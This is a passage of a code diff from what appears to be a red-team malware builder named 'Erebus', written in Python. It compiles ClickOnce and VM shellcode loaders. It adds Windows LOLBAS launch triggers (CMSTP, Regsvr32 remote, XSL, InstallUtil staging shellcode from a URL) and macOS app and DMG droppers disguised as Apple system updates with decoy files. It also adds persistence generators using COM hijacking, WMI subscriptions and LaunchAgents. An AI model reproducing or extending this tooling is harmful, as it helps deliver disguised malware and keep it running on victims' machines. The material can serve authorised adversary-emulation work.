+                        if process.returncode != 0:
                             response.status = BuildStatus.Error
-                            response.build_message = "Failed to compile test payloads"
-                            response.build_stderr = output + f"\nPayloads directory not found or empty: {payloads_dir}"
-                            await self._build_step(compile_step_name, "Failed to Compile Test Payloads", success=False)
+                            response.build_message = f"Makefile publish target failed with exit code {process.returncode}"
+                            response.build_stderr = output
+                            await self._build_step(compile_step_name, f"Makefile publish failed", success=False)
                             return response
 
-                        # Create agent_code/payloads directory for persistent storage
-                        agent_code_payloads_dir = Path(__file__).resolve().parent.parent / "agent_code" / "payloads"
-                        agent_code_payloads_dir.mkdir(parents=True, exist_ok=True)
+                        # Locate publish output
+                        build_config = self.get_parameter('0.3 ClickOnce Build Configuration')
+                        publish_root = Path(clickonce_loader_path) / "bin" / build_config
 
-                        # Create zip file using shutil
-                        timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
-                        zip_basename = f"test_payloads_{timestamp}"
+                        publish_dir = None
+                        if publish_root.exists():
+                            for tfm_dir in publish_root.iterdir():
+                                if tfm_dir.is_dir() and "net" in tfm_dir.name and "-windows" in tfm_dir.name:
+                                    for rid_dir in tfm_dir.iterdir():
+                                        if rid_dir.is_dir():
+                                            candidate = rid_dir / "publish"
+                                            if candidate.exists():
+                                                publish_dir = candidate
+                                                break
+                                    if publish_dir:
+                                        break
 
-                        # Use shutil.make_archive to create zip (it adds .zip automatically)
-                        # This creates the zip in the parent directory of payloads_dir
-                        zip_archive_path = shutil.make_archive(
-                            base_name=str(payloads_dir.parent / zip_basename),
-                            format='zip',
-                            root_dir=str(payloads_dir.parent),
-                            base_dir=payloads_dir.name
-                        )
+                        if not publish_dir or not publish_dir.exists():
+                            response.status = BuildStatus.Error
+                            response.build_message = "Failed to locate ClickOnce publish output directory"
+                            response.build_stderr = output + f"\nSearched in: {publish_root}"
+                            await self._build_step(compile_step_name, "Failed to locate ClickOnce publish output", success=False)
+                            return response
 
-                        output += f"[DEBUG] Created archive at: {zip_archive_path}\n"
-                        output += f"[DEBUG] Archive size: {os.path.getsize(zip_archive_path)} bytes\n"
+                        # Copy cleaned artifacts from publish directory (skip the main exe - renamed below)
+                        payload_dir = Path(agent_build_path) / "payload"
+                        payload_dir.mkdir(parents=True, exist_ok=True)
 
-                        # Move the zip to agent_code/payloads
-                        final_zip_path = agent_code_payloads_dir / f"{zip_basename}.zip"
-                        shutil.move(zip_archive_path, str(final_zip_path))
+                        CLICKONCE_MAIN = {"Erebus.ClickOnce.exe", "Erebus.ClickOnce.dll"}
+                        for item in publish_dir.iterdir():
+                            if item.is_file() and item.name not in CLICKONCE_MAIN:
+                                dest_path = payload_dir / item.name
+                                shutil.copy2(str(item), str(dest_path))
 
-                        output += f"[DEBUG] Moved archive to: {final_zip_path}\n"
+                        output += f"[DEBUG] Cleaned publish artifacts:\n"
+                        for item in publish_dir.iterdir():
+                            if item.is_file():
+                                output += f"  - {item.name} ({item.stat().st_size} bytes)\n"
 
-                        # Also copy individual payloads to agent_code/payloads for easy access
-                        files_copied = 0
-                        for file in payloads_dir.iterdir():
-                            if file.is_file():
-                                shutil.copy(file, agent_code_payloads_dir / file.name)
-                                files_copied += 1
+                        # Locate main executable and copy as erebus.exe / erebus.dll
+                        payload_path = PurePath(agent_build_path) / "payload" / payload_final_name
+                        payload_path = str(payload_path)
 
-                        output += f"[DEBUG] Copied {files_copied} individual files\n"
+                        clickonce_exe = publish_dir / "Erebus.ClickOnce.exe"
+                        clickonce_dll = publish_dir / "Erebus.ClickOnce.dll"
 
-                        if os.path.exists(final_zip_path) and os.path.getsize(final_zip_path) > 0:
+                        if clickonce_exe.exists():
+                            shutil.copy2(str(clickonce_exe), str(payload_path))
+                            response.build_stdout = output + f"\nClickOnce Loader compiled to: {payload_path}"
                             response.status = BuildStatus.Success
-                            response.build_message = f"Test payloads compiled and saved to agent_code/payloads/!"
-                            response.build_stdout = output + f"\nZip: {final_zip_path}\nIndividual files also copied\nContains {files_copied} test payloads"
-                            await self._build_step(compile_step_name, f"{compile_step_msg} Saved {files_copied} payloads to {agent_code_payloads_dir}", success=True)
-
-                            # For test builds, read the zip and return it as the payload
-                            with open(final_zip_path, "rb") as f:
-                                response.payload = f.read()
-                            response.updated_filename = f"{zip_basename}.zip"
-
-                            # Return early for test builds - skip containerization and other steps
-                            return response
+                            response.build_message = "ClickOnce Loader compiled successfully!"
+                        elif clickonce_dll.exists():
+                            payload_path_dll = Path(payload_path).with_suffix(".dll")
+                            shutil.copy2(str(clickonce_dll), str(payload_path_dll))
+                            response.build_stdout = output + f"\nClickOnce Loader compiled to: {payload_path_dll}"
+                            response.status = BuildStatus.Success
+                            response.build_message = "ClickOnce Loader compiled successfully!"
                         else:
                             response.status = BuildStatus.Error
-                            response.build_message = f"Failed to create test payload zip"
-                            response.build_stderr = output + "\n" + str(final_zip_path)
-                            await self._build_step(compile_step_name, f"Failed to package test payloads", success=False)
+                            response.build_message = "Failed to locate compiled ClickOnce executable"
+                            response.build_stderr = output + "\nNo .exe or .dll found in publish directory"
+                            await self._build_step(compile_step_name, "Failed to locate executable", success=False)
                             return response
-                    else:
+
+                        await self._build_step(compile_step_name, compile_step_msg, success=True)
+
+                    elif loader_type == "VM Loader":
                         payload_path = PurePath(agent_build_path) / "payload" / payload_final_name
                         payload_path = str(payload_path)
                         shutil.copy(dst=payload_path, src=payload_output_file)
 
-                        # build_config was resolved at the top of this
-                        # branch (Shellcode Loader, non-test). Threaded
-                        # into the finalizer so debug builds skip the
-                        # sanitizer/self_hunt pair.
+                        build_config = self.get_parameter('0.3 Loader Build Configuration')
                         output += _finalize_pe_artifact(
                             payload_path,
                             str(PurePath(agent_build_path) / "payload"),
@@ -5334,138 +5573,40 @@ generated if none have been entered.""",
 
                         if os.path.exists(payload_path):
                             response.status = BuildStatus.Success
-                            response.build_message = "Loader Compiled!"
+                            response.build_message = "VM Loader Compiled!"
                             response.build_stdout = output + "\n" + payload_path
                             await self._build_step(compile_step_name, compile_step_msg, success=True)
                         else:
                             response.status = BuildStatus.Error
-                            response.build_message = "Failed to compile loader"
+                            response.build_message = "Failed to compile VM Loader"
                             response.build_stderr = output + "\n" + payload_path
-                            await self._build_step(compile_step_name, "Failed to Compile Shellcode Loader", success=False)
+                            await self._build_step(compile_step_name, "Failed to Compile VM Loader", success=False)
                             return response
 
-                elif loader_type == "ClickOnce":
-                    if process.returncode != 0:
+                elif payload_type in ("Linux", "macOS"):
+                    payload_path = PurePath(agent_build_path) / "payload" / payload_final_name
+                    payload_path = str(payload_path)
+
+                    if not os.path.exists(payload_output_file):
                         response.status = BuildStatus.Error
-                        response.build_message = f"Makefile publish target failed with exit code {process.returncode}"
+                        response.build_message = f"Compilation failed - output not found: {payload_output_file}"
                         response.build_stderr = output
-                        await self._build_step(compile_step_name, f"Makefile publish failed", success=False)
+                        await self._build_step(compile_step_name, f"Compilation failed", success=False)
                         return response
 
-                    # Locate publish output
-                    build_config = self.get_parameter('0.3 ClickOnce Build Configuration')
-                    publish_root = Path(clickonce_loader_path) / "bin" / build_config
-
-                    publish_dir = None
-                    if publish_root.exists():
-                        for tfm_dir in publish_root.iterdir():
-                            if tfm_dir.is_dir() and "net" in tfm_dir.name and "-windows" in tfm_dir.name:
-                                for rid_dir in tfm_dir.iterdir():
-                                    if rid_dir.is_dir():
-                                        candidate = rid_dir / "publish"
-                                        if candidate.exists():
-                                            publish_dir = candidate
-                                            break
-                                if publish_dir:
-                                    break
-
-                    if not publish_dir or not publish_dir.exists():
-                        response.status = BuildStatus.Error
-                        response.build_message = "Failed to locate ClickOnce publish output directory"
-                        response.build_stderr = output + f"\nSearched in: {publish_root}"
-                        await self._build_step(compile_step_name, "Failed to locate ClickOnce publish output", success=False)
-                        return response
-
-                    # Copy cleaned artifacts from publish directory (skip the main exe - renamed below)
-                    payload_dir = Path(agent_build_path) / "payload"
-                    payload_dir.mkdir(parents=True, exist_ok=True)
-
-                    CLICKONCE_MAIN = {"Erebus.ClickOnce.exe", "Erebus.ClickOnce.dll"}
-                    for item in publish_dir.iterdir():
-                        if item.is_file() and item.name not in CLICKONCE_MAIN:
-                            dest_path = payload_dir / item.name
-                            shutil.copy2(str(item), str(dest_path))
-
-                    output += f"[DEBUG] Cleaned publish artifacts:\n"
-                    for item in publish_dir.iterdir():
-                        if item.is_file():
-                            output += f"  - {item.name} ({item.stat().st_size} bytes)\n"
-
-                    # Locate main executable and copy as erebus.exe / erebus.dll
-                    payload_path = PurePath(agent_build_path) / "payload" / payload_final_name
-                    payload_path = str(payload_path)
-
-                    clickonce_exe = publish_dir / "Erebus.ClickOnce.exe"
-                    clickonce_dll = publish_dir / "Erebus.ClickOnce.dll"
-
-                    if clickonce_exe.exists():
-                        shutil.copy2(str(clickonce_exe), str(payload_path))
-                        response.build_stdout = output + f"\nClickOnce Loader compiled to: {payload_path}"
-                        response.status = BuildStatus.Success
-                        response.build_message = "ClickOnce Loader compiled successfully!"
-                    elif clickonce_dll.exists():
-                        payload_path_dll = Path(payload_path).with_suffix(".dll")
-                        shutil.copy2(str(clickonce_dll), str(payload_path_dll))
-                        response.build_stdout = output + f"\nClickOnce Loader compiled to: {payload_path_dll}"
-                        response.status = BuildStatus.Success
-                        response.build_message = "ClickOnce Loader compiled successfully!"
-                    else:
-                        response.status = BuildStatus.Error
-                        response.build_message = "Failed to locate compiled ClickOnce executable"
-                        response.build_stderr = output + "\nNo .exe or .dll found in publish directory"
-                        await self._build_step(compile_step_name, "Failed to locate executable", success=False)
-                        return response
-
-                    await self._build_step(compile_step_name, compile_step_msg, success=True)
-
-                elif loader_type == "VM Loader":
-                    payload_path = PurePath(agent_build_path) / "payload" / payload_final_name
-                    payload_path = str(payload_path)
                     shutil.copy(dst=payload_path, src=payload_output_file)
-
-                    build_config = self.get_parameter('0.3 Loader Build Configuration')
-                    output += _finalize_pe_artifact(
-                        payload_path,
-                        str(PurePath(agent_build_path) / "payload"),
-                        build_config=build_config,
-                    )
 
                     if os.path.exists(payload_path):
                         response.status = BuildStatus.Success
-                        response.build_message = "VM Loader Compiled!"
+                        response.build_message = compile_step_msg
                         response.build_stdout = output + "\n" + payload_path
                         await self._build_step(compile_step_name, compile_step_msg, success=True)
                     else:
                         response.status = BuildStatus.Error
-                        response.build_message = "Failed to compile VM Loader"
+                        response.build_message = f"Failed to copy loader to payload dir"
                         response.build_stderr = output + "\n" + payload_path
-                        await self._build_step(compile_step_name, "Failed to Compile VM Loader", success=False)
+                        await self._build_step(compile_step_name, f"Failed to stage loader", success=False)
                         return response
-
-            elif payload_type in ("Linux", "macOS"):
-                payload_path = PurePath(agent_build_path) / "payload" / payload_final_name
-                payload_path = str(payload_path)
-
-                if not os.path.exists(payload_output_file):
-                    response.status = BuildStatus.Error
-                    response.build_message = f"Compilation failed - output not found: {payload_output_file}"
-                    response.build_stderr = output
-                    await self._build_step(compile_step_name, f"Compilation failed", success=False)
-                    return response
-
-                shutil.copy(dst=payload_path, src=payload_output_file)
-
-                if os.path.exists(payload_path):
-                    response.status = BuildStatus.Success
-                    response.build_message = compile_step_msg
-                    response.build_stdout = output + "\n" + payload_path
-                    await self._build_step(compile_step_name, compile_step_msg, success=True)
-                else:
-                    response.status = BuildStatus.Error
-                    response.build_message = f"Failed to copy loader to payload dir"
-                    response.build_stderr = output + "\n" + payload_path
-                    await self._build_step(compile_step_name, f"Failed to stage loader", success=False)
-                    return response
 
             output = ""
             ######################### End Of Payload Build Section #########################
@@ -6392,6 +6533,58 @@ generated if none have been entered.""",
                                 )
                             )
 
+                        # ── LOLBAS triggers (Windows) ────────────────────────
+                        case "CMSTP":
+                            _cmstp_bin = str(self.get_parameter("0.9a Trigger Binary") or "C:\\Windows\\System32\\conhost.exe")
+                            _cmstp_result = await asyncio.get_running_loop().run_in_executor(
+                                None, lambda: create_cmstp_trigger(
+                                    payload_path=_cmstp_bin,
+                                    output_dir=str(payload_dir),
+                                )
+                            )
+                            trigger_path = _cmstp_result.get("inf_path", "")
+
+                        case "Regsvr32":
+                            _r32_bin = str(self.get_parameter("0.9a Trigger Binary") or "C:\\Windows\\System32\\conhost.exe")
+                            _r32_result = await asyncio.get_running_loop().run_in_executor(
+                                None, lambda: create_regsvr32_trigger(
+                                    payload_path=_r32_bin,
+                                    output_dir=str(payload_dir),
+                                    mode="remote",
+                                )
+                            )
+                            trigger_path = _r32_result.get("artifact_path", "")
+
+                        case "XSL":
+                            _xsl_bin = str(self.get_parameter("0.9a Trigger Binary") or "C:\\Windows\\System32\\conhost.exe")
+                            _xsl_result = await asyncio.get_running_loop().run_in_executor(
+                                None, lambda: create_xsl_trigger(
+                                    payload_path=_xsl_bin,
+                                    output_dir=str(payload_dir),
+                                )
+                            )
+                            trigger_path = _xsl_result.get("xsl_path", "")
+
+                        case "InstallUtil":
+                            _iu_bin = str(self.get_parameter("0.9a Trigger Binary") or "")
+                            if _iu_bin and os.path.isfile(_iu_bin):
+                                _iu_result = await asyncio.get_running_loop().run_in_executor(
+                                    None, lambda: create_installutil_trigger(
+                                        payload_path=_iu_bin,
+                                        output_dir=str(payload_dir),
+                                        mode="inline",
+                                    )
+                                )
+                            else:
+                                _iu_result = await asyncio.get_running_loop().run_in_executor(
+                                    None, lambda: create_installutil_trigger(
+                                        payload_path=_iu_bin or "http://localhost/shellcode.bin",
+                                        output_dir=str(payload_dir),
+                                        mode="staged",
+                                    )
+                                )
+                            trigger_path = _iu_result.get("cs_path", "")
+
                         # ── Linux triggers ────────────────────────────────────
                         case "Bash":
                             trigger_path = create_bash_trigger(
@@ -6451,6 +6644,50 @@ generated if none have been entered.""",
                                     payload_dir=payload_dir,
                                     pkg_name="SystemUpdate.pkg",
                                     bundle_id="com.apple.systemupdate",
+                                )
+                            )
+
+                        case "AppBundle":
+                            _ab_payload = payload_dir / "payload"
+                            trigger_path = await asyncio.get_running_loop().run_in_executor(
+                                None, lambda: create_appbundle_trigger(
+                                    payload_path=str(_ab_payload),
+                                    output_dir=payload_dir,
+                                    app_name="Update",
+                                    bundle_id="com.apple.systemupdate",
+                                    ad_hoc_sign=False,
+                                    decoy_path=str(decoy_file) if decoy_file.exists() else "",
+                                    payload_dir=payload_dir,
+                                )
+                            )
+
+                        case "AppBundle-AdHoc":
+                            _ab_payload = payload_dir / "payload"
+                            trigger_path = await asyncio.get_running_loop().run_in_executor(
+                                None, lambda: create_appbundle_trigger(
+                                    payload_path=str(_ab_payload),
+                                    output_dir=payload_dir,
+                                    app_name="Update",
+                                    bundle_id="com.apple.systemupdate",
+                                    ad_hoc_sign=True,
+                                    decoy_path=str(decoy_file) if decoy_file.exists() else "",
+                                    payload_dir=payload_dir,
+                                )
+                            )
+
+                        case "DMG":
+                            _dmg_payload = payload_dir / "payload"
+                            trigger_path = await asyncio.get_running_loop().run_in_executor(
+                                None, lambda: create_dmg_trigger(
+                                    payload_path=str(_dmg_payload),
+                                    output_dir=payload_dir,
+                                    app_name="Update",
+                                    dmg_name="Install.dmg",
+                                    volume_name="Installer",
+                                    bundle_id="com.apple.systemupdate",
+                                    ad_hoc_sign=False,
+                                    decoy_path=str(decoy_file) if decoy_file.exists() else "",
+                                    payload_dir=payload_dir,
                                 )
                             )
 
@@ -6660,6 +6897,71 @@ generated if none have been entered.""",
                     await self._build_step(
                         "[T1566.001] - Decoy Document",
                         f"Decoy document generation failed: {_decoy_ex}",
+                        success=False,
+                    )
+
+            # Standalone persistence artifact generation
+            if self.get_parameter("10.0 Standalone Persistence"):
+                try:
+                    _persist_method  = self.get_parameter("10.1 Persistence Method") or "COM Hijack"
+                    _persist_binary  = self.get_parameter("10.2 Persistence Target Binary") or ""
+                    _persist_out_dir = str(Path(agent_build_path) / "payload" / "persistence")
+
+                    match _persist_method:
+                        case "COM Hijack":
+                            _com_result = await asyncio.get_running_loop().run_in_executor(
+                                None, lambda: create_com_hijack_dropper(
+                                    payload_path=_persist_binary or "C:\\ProgramData\\Update\\loader.exe",
+                                    output_dir=_persist_out_dir,
+                                )
+                            )
+                            _persist_detail = (
+                                f"COM Hijack artifacts in persistence/\n"
+                                f"  reg  : {_com_result.get('reg_path', '')}\n"
+                                f"  CLSID: {_com_result.get('clsid', '')}\n"
+                                f"  import: {_com_result.get('import_cmd', '')}"
+                            )
+
+                        case "WMI Subscription":
+                            _wmi_result = await asyncio.get_running_loop().run_in_executor(
+                                None, lambda: create_wmi_subscription(
+                                    payload_path=_persist_binary or "C:\\ProgramData\\Update\\loader.exe",
+                                    output_dir=_persist_out_dir,
+                                )
+                            )
+                            _persist_detail = (
+                                f"WMI Subscription artifacts in persistence/\n"
+                                f"  ps1     : {_wmi_result.get('ps1_path', '')}\n"
+                                f"  mof     : {_wmi_result.get('mof_path', '')}\n"
+                                f"  mofcomp : {_wmi_result.get('mofcomp_cmd', '')}"
+                            )
+
+                        case "LaunchAgent":
+                            _la_result = await asyncio.get_running_loop().run_in_executor(
+                                None, lambda: create_launchagent(
+                                    payload_path=_persist_binary or "/tmp/loader",
+                                    output_dir=_persist_out_dir,
+                                )
+                            )
+                            _persist_detail = (
+                                f"LaunchAgent artifacts in persistence/\n"
+                                f"  plist  : {_la_result.get('plist_path', '')}\n"
+                                f"  install: {_la_result.get('install_sh', '')}\n"
+                                f"  load   : {_la_result.get('load_cmd', '')}"
+                            )
+
+                        case _:
+                            _persist_detail = f"Unknown persistence method: {_persist_method}"
+
+                    await self._build_step(
+                        "[T1546] - Standalone Persistence",
+                        _persist_detail,
+                        success=True,
+                    )
+                except Exception as _persist_ex:
+                    await self._build_step(
+                        "[T1546] - Standalone Persistence",
+                        f"Persistence artifact generation failed: {_persist_ex}",
                         success=False,
                     )
 
